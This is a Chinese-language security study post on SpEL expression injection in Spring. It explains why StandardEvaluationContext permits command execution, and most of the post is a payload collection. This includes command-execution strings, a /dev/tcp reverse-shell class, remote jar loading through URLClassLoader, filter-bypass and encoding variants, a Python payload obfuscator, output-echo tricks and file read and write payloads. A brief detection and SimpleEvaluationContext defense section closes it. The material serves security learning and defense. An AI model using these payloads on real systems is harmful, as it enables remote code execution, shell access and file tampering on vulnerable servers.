# Java安全学习—SpEL表达式注入

Author: H3rmesk1t

Data: 2022.03.18

# SpEL 简介
`Spring`表达式语言（简称`SpEl`）是一个支持查询和操作运行时对象导航图功能的强大的表达式语言. 它的语法类似于传统`EL`, 但提供额外的功能, 最出色的就是函数调用和简单字符串的模板函数.

尽管有其他可选的`Java`表达式语言, 如`OGNL`, `MVEL`, `JBoss EL`等等, 但`Spel`创建的初衷是了给`Spring`社区提供一种简单而高效的表达式语言, 一种可贯穿整个`Spring`产品组的语言, 这种语言的特性应基于`Spring`产品的需求而设计. 虽然`SpEL`引擎作为`Spring`组合里的表达式解析的基础, 但它不直接依赖于`Spring`, 可独立使用. 

`SpEL`特性:
 - 使用`Bean`的`ID`来引用`Bean`;
 - 可调用方法和访问对象的属性;
 - 可对值进行算数、关系和逻辑运算;
 - 可使用正则表达式进行匹配;
 - 可进行集合操作.

`SpEL`表达式语言支持以下功能:
 - 文字表达式.
 - 布尔和关系运算符.
 - 正则表达式.
 - 类表达式.
 - 访问`properties`, `arrays`, `lists`, `maps`.
 - 方法调用.
 - 关系运算符.
 - 参数.
 - 调用构造函数.
 - `Bean`引用.
 - 构造`Array`.
 - 内嵌`lists`.
 - 内嵌`maps`.
 - 三元运算符.
 - 变量.
 - 用户定义的函数.
 - 集合投影.
 - 集合筛选.
 - 模板表达式.

# SpEL 使用
`SpEL`的用法有三种形式, 一种是在注解`@Value`中, 一种是`XML`配置, 最后一种是在代码块中使用`Expression`.

## 注解 @Value 用法
`@Value`能修饰成员变量和方法形参, `#{}`内就是`SpEL`表达式的语法, `Spring`会根据`SpEL`表达式语法为变量赋值.

```java
public class User {
    @Value("${ spring.user.name }")
    private String Username;
    @Value("#{ systemProperties['user.region'] }")    
    private String defaultLocale;
    //...
}
```

## XML 配置用法
在`SpEL`表达式中, 使用`T(Type)`运算符会调用类的作用域和方法, `T(Type)`操作符会返回一个`object`, 它可以帮助获取某个类的静态方法, 用法`T(全限定类名).方法名()`, 即可以通过该类类型表达式来操作类, 例如:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd ">

    <bean id="helloWorld" class="com.mi1k7ea.HelloWorld">
        <property name="message" value="#{T(java.lang.Runtime).getRuntime().exec('calc')}" />
    </bean>
</beans>
```

## Expression 用法
各种`Spring CVE`漏洞基本都是基于`Expression`形式的`SpEL`表达式注入. 

`SpEL`在求表达式值时一般分为四步:
 1. 创建解析器: `SpEL`使用`ExpressionParser`接口表示解析器, 提供`SpelExpressionParser`默认实现;
 2. 解析表达式: 使用`ExpressionParser`的`parseExpression`来解析相应的表达式为`Expression`对象;
 3. 构造上下文: 准备比如变量定义等等表达式需要的上下文数据(可省);
 4. 求值: 通过`Expression`接口的`getValue`方法根据上下文获得表达式值.

主要接口:
 - `ExpressionParser`接口: 表示解析器, 默认实现是`org.springframework.expression.spel.standard`包中的`SpelExpressionParser`类, 使用`parseExpression`方法将字符串表达式转换为`Expression`对象, 对于`ParserContext`接口用于定义字符串表达式是不是模板, 以及模板开始与结束字符;
 - `EvaluationContext`接口: 表示上下文环境, 默认实现是`org.springframework.expression.spel.support`包中的`StandardEvaluationContext`类, 使用`setRootObject`方法来设置根对象, 使用`setVariable`方法来注册自定义变量, 使用`registerFunction`来注册自定义函数等等.
 - `Expression`接口: 表示表达式对象, 默认实现是`org.springframework.expression.spel.standard`包中的`SpelExpression`, 提供`getValue`方法用于获取表达式值, 提供`setValue`方法用于设置对象值.

示例代码如下, 和前面`XML`配置的用法区别在于程序会将这里传入`parseExpression`函数的字符串参数当成`SpEL`表达式来解析, 而无需通过`#{}`符号来注明:

```java
// 操作类弹计算器, java.lang包下的类是可以省略包名的.
String spel = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";

// String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(spel);
System.out.println(expression.getValue());
```

在该用法中, 类实例化同样使用`Java`关键字`new`, 且类名必须是全限定名(`java.lang`包内的类型除外).

# SpEL 表达式注入漏洞
## 漏洞原理
`SimpleEvaluationContext`和`StandardEvaluationContext`是`SpEL`提供的两个`EvaluationContext`:
 - `SimpleEvaluationContext`: 针对不需要`SpEL`语言语法的全部范围并且应该受到有意限制的表达式类别, 公开`SpEL`语言特性和配置选项的子集.
 - `StandardEvaluationContext`: 公开全套`SpEL`语言功能和配置选项, 可以使用它来指定默认的根对象并配置每个可用的评估相关策略.

`SimpleEvaluationContext`旨在仅支持`SpEL`语言语法的一个子集, 不包括`Java`类型引用、构造函数和`bean`引用; 而`StandardEvaluationContext`是支持全部`SpEL`语法的.

由前面知道, `SpEL`表达式是可以操作类及其方法的, 可以通过类类型表达式`T(Type)`来调用任意类方法. 这是因为在不指定`EvaluationContext`的情况下默认采用的是`StandardEvaluationContext`, 而它包含了`SpEL`的所有功能, 在允许用户控制输入的情况下可以成功造成任意命令执行.

<div align=center><img src="./images/1.png"></div>

## 过程分析
将断点打在`getValue`处, 跟进`SpelExpression#getValue`, 在创建实例`ExpressionState`时, 调用`this.getEvaluationContext`方法.

<div align=center><img src="./images/2.png"></div>

由于没有指定`evaluationContext`, 会默认获取`StandardEvaluationContext`实例, 上文讲了其包含了`SpEL`的所有功能, 这也就是命令得以执行的原因.

<div align=center><img src="./images/3.png"></div>

接着就是获取类然后调用相应的方法来执行命令.

## PoC
### ProcessBuilder

```java
new java.lang.ProcessBuilder(new String[]{"open", "-a", "Calculator"}).start()
```

```java
new ProcessBuilder(new String[]{"open", "-a", "Calculator"}).start()
```

### RunTime
说明: 由于`RunTime`类使用了单例模式, 获取对象不能直接通过构造方法获得, 必须通过静态方法`getRuntime`来获得, 调用静态方法的话需要使用`SpEL`的`T()`操作符, `T()`操作符会返回一个`object`.

```java
T(java.lang.Runtime).getRuntime().exec("open -a Calculator")
```

```java
T(Runtime).getRuntime().exec(new String[]{"open", "-a", "Calculator"})
```

### ScriptEngine
由于`JS`中的`eval`函数可以把字符串当成代码进行解析, 且从`JDK6`开始自带`ScriptEngineManager`这个类, 支持在`JS`中调用`Java`的对象. 因此, 可以利用`Java`调用`JS`引擎的`eval`, 然后在`Payload`中反过来调用`Java`对象.

获取所有`JavaScript`引擎信息:

```java
public static void main(String[] args) {
    ScriptEngineManager manager = new ScriptEngineManager();
    List<ScriptEngineFactory> factories = manager.getEngineFactories();
    for (ScriptEngineFactory factory: factories){
            System.out.printf(
                "Name: %s%n" + "Version: %s%n" + "Language name: %s%n" +
                "Language version: %s%n" +
                "Extensions: %s%n" +
                "Mime types: %s%n" +
                "Names: %s%n",
                factory.getEngineName(),
                factory.getEngineVersion(),
                factory.getLanguageName(),
                factory.getLanguageVersion(),
                factory.getExtensions(),
                factory.getMimeTypes(),
                factory.getNames()
            );
    }
}
```
通过输出结果可以知道, `getEngineByName`的参数可以填`nashorn`, `Nashorn`, `js`, `JS`, `JavaScript`, `javascript`, `ECMAScript`, `ecmascript`.

```java
// nashorn 可以换成其他的引擎名称
new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[3];s[0]='open';s[1]='-a';s[2]='Calculator';java.lang.Runtime.getRuntime().exec(s);")
```

### UrlClassLoader
`JVM`拥有多种`ClassLoader`, 不同的`ClassLoader`会从不同的地方加载字节码文件, 加载方式可以通过不同的文件目录加载, 也可以从不同的`jar`文件加载, 还包括使用网络服务地址来加载. 常见的几个重要的`ClassLoader`: `BootstrapClassLoader`、`ExtensionClassLoader`和`AppClassLoader`、`UrlClassLoader`.

利用思路: 远程加载`class`文件, 通过函数调用或者静态代码块来调用. 先构造一份`Exploit.class`放到远程`vps`即可

例如, 通过构造方法反弹`shell`的`exp.java`:

```java
public class exp {
    public exp(String address) {
        address = address.replace(":","/");
        ProcessBuilder p = new ProcessBuilder("/bin/bash","-c","exec 5<>/dev/tcp/"+address+";cat <&5 | while read line; do $line 2>&5 >&5; done");
        try {
            p.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:9999/exp.jar")}).loadClass("exp").getConstructors()[0].newInstance("127.0.0.1:2333")
```

### AppClassLoader
`AppClassLoader`直接面向用户, 它会加载`Classpath`环境变量里定义的路径中的`jar`包和目录. 由于双亲委派的存在, 它可以加载到我们想要的类. 使用的前提是获取, 获取`AppClassLoader`可以通过`ClassLoader`类的静态方法`getSystemClassLoader`.

```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.ProcessBuilder").getConstructors()[1].newInstance(new String[]{"open", "-a", "Calculator"}).start()
```

### 通过其他类获取 AppClassLoader
在实际项目中, 开发者往往会导入很多依赖的`jar`, 或编写自定义类.

例如, 这里利用类`org.springframework.expression.Expression`来获取`AppClassLoader`.

```java
T(org.springframework.expression.spel.standard.SpelExpressionParser).getClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

<div align=center><img src="./images/4.png"></div>

例如, 这里利用自定义类`h3rmek1t.javawebsecurity.ElShell`来获取`AppClassLoader`.

```java
T(h3rmek1t.javawebsecurity.ElShell).getClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

<div align=center><img src="./images/5.png"></div>

### 通过内置对象加载 UrlClassLoader
参考[Spring SPEL注入漏洞利用](https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&idx=1&mid=2650174018&sn=94cd324370afc2024346f7c508ff77dd). `request`、`response`对象是`web`项目的常客, 在`web`项目如果引入了`spel`的依赖, 那么这两个对象会自动被注册进去.

```java
{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch/tmp/foobar\")}
```

```java
username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('open -a Calculator')")]=asdf
```

## ByPass
### 反射调用

```java
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

```java
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("open -a Calculator")
```

### 反射调用 && 字符串拼接

```java
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"open","-a","Calculator"})
```

```java
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"open","-a","Calculator"})
```

### 动态生成字符
当执行的系统命令被过滤或者被`URL`编码掉时, 可以通过`String`类动态生成字符.

 - Part1
```java
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(111).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)))
```

 - Part2
```java
new java.lang.ProcessBuilder(new String[]{new java.lang.String(new byte[]{111,112,101,110}),new java.lang.String(new byte[]{45,97}),new java.lang.String(new byte[]{67,97,108,99,117,108,97,116,111,114})}).start()
```

用于`String`类动态生成字符的字符`ASCII`码转换生成:

```python
def shell():
    shell = input('Enter shell to encode: ')

    part1_shell = 'T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(shell[0])
    for c in shell[1:]:
        part1_shell += '.concat(T(java.lang.Character).toString(%s))' % ord(c)
    part1_shell += ')'
    print('\nPart1: ')
    print(part1_shell + '\n')

    part2_shell = 'new java.lang.ProcessBuilder(new String[]{'
    args = shell.split(' ')
    len_args = len(args)
    len_temp = 0
    while(len_temp < len_args):
        temp = 'new java.lang.String(new byte[]{'
        for i in range(len(args[len_temp])):
            temp += str(ord(args[len_temp][i]))
            if (i != len(args[len_temp]) - 1):
                temp += ','
        temp += '})'
        part2_shell += temp
        len_temp += 1
        if len_temp != len_args:
            part2_shell += ','

    part2_shell += '}).start()'
    print('\nPart2: ')
    print(part2_shell + '\n')

if __name__ == '__main__':
    shell()
```

### JavaScript 引擎

```java
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='open';s[1]='-a';s[2]='Calculator';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
```

```java
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(\"s=[3];s[0]='open';s[1]='-a';s[2]='Calculator';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\"))
```

### JavaScript 引擎 && 反射调用

```java
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"open","-a","Calculator"})))
```

### JavaScript 引擎 && URL 编码

```java
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(java.net.URLDecoder).decode(\"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%6f%70%65%6e%20%2d%61%20%43%61%6c%63%75%6c%61%74%6f%72%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\")))
```

### JShell
在`JDK9`中新增的`shell`.

```java
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('open -a Calculator').toString()
```

### 绕过 T( 过滤
`SpEL`对字符的编码时, `%00`会被直接替换为空.

```java
T%00(new)
```

### 绕过 getClass(

```java
// 这里的 15 可能需要替换为 14, 不同 jdk 版本的序号不同.
"".class.getSuperclass().class.forName("java.lang.Runtime").getDeclaredMethods()[15].invoke("".class.getSuperclass().class.forName("java.lang.Runtime").getDeclaredMethods()[7].invoke(null),"open -a Calculator")
```


## 回显
上文中讲述了如何通过`SpEL`执行系统命令, 接着来看看如何在一行`SpEL`语句中获得命令执行的回显.

### commons-io
使用`commons-io`这个组件实现回显, 这种方式会受限于目标服务器是否存在这个组件, `springboot`默认环境下都没有用到这个组件.

```java
T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())
```

### JShell
上文中的`JShell`是可以实现回显输出的, 但是这种方式会受限于`jdk`的版本问题.

```java
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

### BufferedReader
`jdk`原生类实现回显的输出, 但是该方法只能读取一行.

```java
new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("whoami").start().getInputStream(), "gbk")).readLine()
```

### Scanner
利用`Scanner#useDelimiter`方法使用指定的字符串分割输出, 因此这里给一个乱七八糟的字符串即可, 就会让所有的字符都在第一行, 然后执行`next`方法即可获得所有输出.

```java
new java.util.Scanner(new java.lang.ProcessBuilder("ls", "/").start().getInputStream(), "GBK").useDelimiter("h3rmesk1t").next()
```

## 读写文件
 - 读文件

```java
new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/shell.jsp"))))
```

 - 写文件

```java
T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("file:/C:/Users/helloworld/shell.jsp")), '123464987984949'.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)
```

# 检测与防御
## 检测方法
全局搜索关键特征:

```java
// 关键类
org.springframework.expression.Expression
org.springframework.expression.ExpressionParser
org.springframework.expression.spel.standard.SpelExpressionParser

// 调用特征
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(str);
expression.getValue()
expression.setValue()
```

## 防御方法
最直接的修复方法是使用`SimpleEvaluationContext`替换`StandardEvaluationContext`.

```java
String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";
ExpressionParser parser = new SpelExpressionParser();
Student student = new Student();
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();
Expression expression = parser.parseExpression(spel);
System.out.println(expression.getValue(context));
```


# 参考
 - [SpEL注入RCE分析与绕过](https://xz.aliyun.com/t/9245#toc-5)

 - [SpEL表达式注入漏洞总结](https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)

 - [Spring 表达式语言 (SpEL)](http://itmyhome.com/spring/expressions.html)